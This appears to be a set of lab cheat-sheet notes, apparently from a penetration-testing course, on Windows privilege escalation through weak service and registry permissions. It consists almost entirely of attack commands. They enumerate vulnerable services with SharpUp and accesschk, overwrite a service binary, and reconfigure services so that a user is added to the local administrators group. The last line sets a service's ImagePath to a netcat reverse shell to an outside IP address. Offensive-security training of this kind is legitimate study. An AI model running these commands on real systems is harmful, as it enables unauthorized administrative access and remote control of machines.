## Permissive File System ACLs
#### Running SharpUp

We can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.
```powershell
PS C:\htb> .\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"
  
  <SNIP>
```
#### Checking Permissions with icacls

```powershell
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```
#### Replacing Service Binary

```cmd
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```
## Weak Service Permissions
#### Reviewing SharpUp Again

```cmd
C:\htb> SharpUp.exe audit
```
#### Checking Permissions with AccessChk

```cmd
C:\htb> accesschk.exe /accepteula -quvcw WindscribeService
```
#### Check Local Admin Group

```cmd
C:\htb> net localgroup administrators
```
#### Changing the Service Binary Path

```cmd
C:\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```
#### Stopping Service

```cmd
C:\htb> sc stop WindscribeService
```
#### Starting the Service

```cmd
C:\htb> sc start WindscribeService

[SC] StartService FAILED 1053:
 
The service did not respond to the start or control request in a timely fashion.
```
#### Confirming Local Admin Group Addition

```cmd
C:\htb> net localgroup administrators
```
## Weak Service Permissions - Cleanup
#### Reverting the Binary Path

```cmd
C:\htb> sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
```
#### Starting the Service Again

```cmd
C:\htb> sc start WindScribeService
```
#### Verifying Service is Running

```cmd
C:\htb> sc query WindScribeService
```
## Unquoted Service Path
#### Service Binary Path

```shell
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```
#### Querying Service

```cmd
C:\htb> sc qc SystemExplorerHelpService
```
#### Searching for Unquoted Service Paths

```cmd
C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```
## Permissive Registry ACLs
#### Checking for Weak Service ACLs in Registry

```cmd
C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```
#### Changing ImagePath with PowerShell

```powershell
PS C:\htb> Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```
